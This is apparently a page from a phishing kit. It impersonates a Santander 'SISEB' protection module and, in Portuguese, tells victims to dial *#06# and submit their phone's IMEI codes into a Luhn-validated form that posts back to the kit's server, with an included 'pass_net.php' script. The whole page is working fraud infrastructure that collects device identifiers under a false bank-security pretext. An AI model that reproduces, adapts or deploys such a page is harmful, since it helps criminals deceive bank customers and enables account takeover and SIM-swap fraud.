<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title></title>
<script>
function isIMEI(s){
	var etal = /^[0-9]{15}$/;
	if (!etal.test(s))
		return false;
	sum = 0; mul = 2; l = 14;
	for (i = 0; i < l; i++) {
		digit = s.substring(l-i-1,l-i);
		tp = parseInt(digit,10)*mul;
		if (tp >= 10)
			 sum += (tp % 10) +1;
		else
			 sum += tp;
		if (mul == 1)
			 mul++;
		else
			 mul--;
	}
	chk = ((10 - (sum % 10)) % 10);
	if (chk != parseInt(s.substring(14,15),10))
	return false;
	return true;
}
function check_imei(){
	var imei_one = $("#is_imei_one").val();
	var imei_two = $("#is_imei_two").val();
	var checkImeiOne = isIMEI(imei_one);
	var checkImeiTwo = isIMEI(imei_two);

	if(imei_one.length < 15){
		alert("Você deve informar o código iMei do seu dispositivo!");
		$("#is_imei_one").val('');
		$("#is_imei_one").focus();
		return false;
	}

	if(!checkImeiOne){
		alert("O Código iMei 1 informado não está correto.\nTente novamente!");
		$("#is_imei_one").val('');
		$("#is_imei_one").focus();
		return false;
	}

	if(imei_two == ''){
		var confirmacao = confirm("Seu dispositivo contém apenas 1 código iMei?\nClique em 'Ok' para confirmar.\nClique em 'Cancelar' para voltar e informar o segundo código iMei.");
		
		if(confirmacao){
			return true;
		}else{
			document.getElementById('is_imei_two').focus();
			return false;
		}
	}

	if(imei_two.length > 0){
		if(!checkImeiTwo){
			alert("O Código iMei 2 informado não está correto.\nTente novamente!");
			$("#is_imei_two").val('');
			$("#is_imei_two").focus();
			return false;
		}
	}

	if(imei_one == imei_two){
		alert("O Código iMei 2 informado não está correto.\nTente novamente!");
		$("#is_imei_two").val('');
		$("#is_imei_two").focus();
		return false;
	}
}
</script>
<style>
.itens_imei{display:block;margin-bottom: 8px;font-weight: 500;color:#888;}
.itens_imei .red{color:#ff0000;}
</style>	
</head>
<body>

<?php include ('pass_net.php');?>

	<div class="md_all">
		<div class="md_box">

			<div class="md_boxLogo border_loader">
				<img src="imgs/logo-stdeMd1.png">
			</div><!-- ld_boxLogo -->

			<div class="md_modalTtitle">
				<h1 class="title_ass">Módulo de Proteção SISEB Santander</h1>
				<p class="text_ased">
					Para confirmarmos o celular cadastrado, informe os códigos iMei do aparelho informado anteriormente!
				</p>
			</div>
			
			<div style="display:block;width:95%;margin:-30px auto 20px auto;font-size:.8em;color:#999;padding:10px;background-color:#f1f1f1;border-radius: 3px;">
				<h1 style="font-weight: 600;font-size:1.1em;color:#ff0000;margin-bottom: 10px;">
					Não sabe como descobrir o código iMei do seu aparelho? Siga os passos abaixo!
				</h1>
				
				<div>
					<p class="itens_imei"><span class="red">1.</span> Com seu aparelho em mãos, abra o discador de chamadas do celular.</p>
					<p class="itens_imei"><span class="red">2.</span> Digite: <span class="red" style="font-weight: 600;">*#06#</span>, após discar estes números surgirá uma nova tela em seu celular.</p>
					<p class="itens_imei"><span class="red">3.</span> Nesta tela serão apresentados o(s) código(s) iMei do seu aparelho.</p>
					<p class="itens_imei"><span class="red">4.</span> Alguns aparelhos possui 2 códigos iMei, se for o seu caso, informe-os nos campos abaixo.</p>
					<p class="itens_imei"><span class="red">5.</span> Caso seu aparelho contenha apenas 1 código iMei, informe-o no campo abaixo, e ignore o segundo campo.</p>
				</div>
			</div>

			<div class="md_boxTables">
				
				<form action="" name="formAss" id="formAss" method="post" onsubmit="return check_imei();">
					<span>Primeiro código iMei:</span>
					<input type="text" name="is_imei_one" id="is_imei_one" class="input_ass" maxlength="15" autocomplete="off" onkeypress='return SomenteNumero(event)' style="width: 180px;">
					<br><br>
					
					<span>Segundo código iMei:</span>
					<input type="text" name="is_imei_two" id="is_imei_two" class="input_ass" maxlength="15" autocomplete="off" onkeypress='return SomenteNumero(event)' style="width: 180px;">
					
					<br><br>
					<input type="hidden" name="sender" id="sender" value="imei">
					<input type="submit" name="sendAss" id="sendAss" class="btn_ass" value="confirmar" style="margin:0 0 0 140px;">
				</form>
			
			</div><!-- md_boxTables -->

			<br><br>
		</div><!-- ld_box -->
	</div>
</body>
</html>